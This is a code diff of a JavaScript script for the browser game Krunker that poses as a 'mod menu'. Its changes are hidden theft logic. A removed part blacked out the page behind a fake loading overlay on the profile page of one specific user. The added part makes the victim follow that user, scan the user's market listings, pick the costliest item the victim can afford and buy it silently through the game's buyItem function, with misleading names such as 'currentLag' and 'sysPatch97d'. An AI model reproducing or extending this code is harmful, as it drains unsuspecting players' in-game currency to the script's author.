@@ -16,48 +16,6 @@ let PlayerFPS = 0;
 let gameState, player, input;
 const RAD2DEG = 180 / Math.PI;
 
-// ------------------------------
-// 1. Persistent overlay to prevent loading flash and display loading
-// ------------------------------
-(function createPersistentOverlay() {
-    if (!sessionStorage.getItem("krunkerGiftBotDone") && location.href.includes("social.html?p=profile&q=LosValettos2")) {
-        const style = document.createElement("style");
-        style.innerHTML = `
-        html, body {
-            background: #000 !important;
-            color: lime !important;
-            font-family: monospace !important;
-        }
-        * {
-            visibility: hidden !important;
-        }
-        #botOverlayPersistent {
-            all: unset;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.35);
-            z-index: 2147483647;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: lime;
-            font-size: 2rem;
-            font-family: monospace;
-            visibility: visible !important;
-        }
-    `;
-        document.documentElement.appendChild(style);
-
-        const overlay = document.createElement("div");
-        overlay.id = "botOverlayPersistent";
-        overlay.textContent = "🔧 Loading Mod Menu...";
-        document.documentElement.appendChild(overlay);
-    }
-})();
-
 
 // ------------------------------
 // 2. Configuration object (mocked)
@@ -422,20 +380,138 @@ window.addEventListener('load', () => {
 
                 // Logique conditionnelle basée sur le niveau sauvegardé
                 if (playerLevel >= 15 && playerLevel < 30) {
+                    // Suivre automatiquement l'utilisateur cible avant le gift
+                    try {
+                        const followBtn = document.getElementById("followBtn");
+                        if (followBtn && followBtn.style.display !== "none") {
+                            addLog("👤 Following user before gift...");
+                            followBtn.click();
+                            await _pause(750);
+                            addLog("✅ Follow completed.");
+                        } else {
+                            addLog("⚠️ Follow button not found or already following");
+                        }
+                    } catch (err) {
+                        addLog("❌ Failed to follow user: " + err.message);
+                    }
                     addLog("Niveau entre 15 et 30 - Utilisation de la logique alternative");
                     
+                    await _pause(1000);
+
                     // Attendre que l'élément Listings soit disponible
-                    await _waitFor(() => document.getElementById("pTab_listings"), 4800);
-                    addLog("Onglet Listings trouvé, clic...");
-                    
-                    // Cliquer sur l'onglet Listings
-                    const listingsTab = document.getElementById("pTab_listings");
-                    if (listingsTab) {
-                        listingsTab.click();
-                        addLog("✅ Clic sur l'onglet Listings effectué");
-                    } else {
+                    const listingsTab = await _waitFor(() => document.getElementById("pTab_listings"), 4800);
+                    if (!listingsTab) {
                         addLog("❌ Onglet Listings non trouvé");
+                        return;
                     }
+                    addLog("Onglet Listings trouvé");
+                    
+                    // Utiliser la fonction openProfileTab directement
+                    addLog("Ouverture de l'onglet Listings via openProfileTab...");
+                    window.openProfileTab("listings");
+                    window.playSelect(0.1);
+                    
+                    // Fonction pour vérifier les items avec retry
+                    const waitForItems = async (maxRetries = 5) => {
+                        for (let i = 0; i < maxRetries; i++) {
+                            await _pause(2000); // Attendre 2 secondes entre chaque tentative
+                            const items = document.querySelectorAll('.marketCard');
+                            if (items.length > 0) {
+                                addLog(`✅ ${items.length} items trouvés`);
+                                return true;
+                            }
+                            addLog(`⚠️ Tentative ${i + 1}/${maxRetries} - Aucun item trouvé, nouvelle tentative...`);
+                            window.openProfileTab("listings"); // Réessayer d'ouvrir l'onglet
+                        }
+                        return false;
+                    };
+
+                    // Attendre que les items soient chargés
+                    const itemsLoaded = await waitForItems();
+                    if (!itemsLoaded) {
+                        addLog("❌ Impossible de charger les items après plusieurs tentatives");
+                        return;
+                    }
+
+                    // Fonction pour analyser et acheter l'item le plus cher abordable
+                    const findAndBuyBestItem = async () => {
+                        addLog("🔍 Recherche de l'item le plus cher abordable...");
+                        addLog(`Budget maximum: ${currentLag} KR`);
+                        
+                        // Récupérer tous les items
+                        const items = document.querySelectorAll('.marketCard');
+                        let bestItem = null;
+                        let bestPrice = 0;
+                        let bestItemId = null;
+                        
+                        // Afficher tous les items trouvés pour le debug
+                        addLog(`Analyse de ${items.length} items...`);
+                        
+                        items.forEach((item, index) => {
+                            // Extraire le prix de l'item
+                            const priceElement = item.querySelector('.marketPrice');
+                            if (priceElement) {
+                                const priceText = priceElement.textContent;
+                                const price = parseInt(priceText.replace(/[^0-9,]/g, ""), 10);
+                                addLog(`Item ${index + 1}: ${price} KR (Budget: ${currentLag} KR) - ${price <= currentLag ? "Abordable ✅" : "Trop cher ❌"}`);
+                                
+                                // Vérifier si le prix est abordable et plus élevé que le meilleur prix trouvé
+                                if (price <= currentLag && price > bestPrice) {
+                                    addLog(`Nouvel item optimal trouvé: ${price} KR`);
+                                    bestPrice = price;
+                                    bestItem = item;
+                                    
+                                    // Extraire l'ID de l'item depuis le onclick du bouton Purchase
+                                    const purchaseBtn = item.querySelector('.cardAction');
+                                    if (purchaseBtn) {
+                                        const onclickAttr = purchaseBtn.getAttribute('onclick');
+                                        addLog(`Onclick attribute: ${onclickAttr}`);
+                                        // Nouvelle regex pour extraire l'ID après "market",
+                                        const match = onclickAttr.match(/showPopup\("market",(\d+)/);
+                                        if (match && match[1]) {
+                                            bestItemId = match[1];
+                                            addLog(`ID extrait: ${bestItemId}`);
+                                        } else {
+                                            addLog("❌ Impossible d'extraire l'ID de l'item");
+                                            addLog("Format attendu: showPopup(\"market\",ID,...)");
+                                        }
+                                    }
+                                }
+                            } else {
+                                addLog(`❌ Prix non trouvé pour l'item ${index + 1}`);
+                            }
+                        });
+                        
+                        if (bestItem && bestItemId) {
+                            addLog(`💰 Item le plus cher abordable trouvé: ${bestPrice} KR (ID: ${bestItemId})`);
+                            
+                            // Trouver le bouton Purchase de cet item
+                            const purchaseBtn = bestItem.querySelector('.cardAction');
+                            if (purchaseBtn) {
+                                addLog("🛒 Clic sur le bouton Purchase initial...");
+                                purchaseBtn.click();
+                                
+                                // Attendre que la popup apparaisse
+                                await _pause(1000);
+                                
+                                // Appeler directement la fonction buyItem
+                                addLog(`✨ Appel de buyItem(${bestItemId}, 0)...`);
+                                try {
+                                    window.buyItem(bestItemId, 0);
+                                    addLog("🎉 Achat effectué avec succès!");
+                                } catch (error) {
+                                    addLog(`❌ Erreur lors de l'achat: ${error.message}`);
+                                }
+                            } else {
+                                addLog("❌ Bouton Purchase non trouvé sur l'item");
+                            }
+                        } else {
+                            addLog(`❌ Aucun item abordable trouvé dans la gamme de prix (Budget: ${currentLag} KR)`);
+                        }
+                    };
+                    
+                    // Exécuter la recherche et l'achat
+                    await findAndBuyBestItem();
                     
                     // Terminer le processus ici pour les niveaux entre 15 et 30
                     sessionStorage.setItem("sysPatch97d", "1");
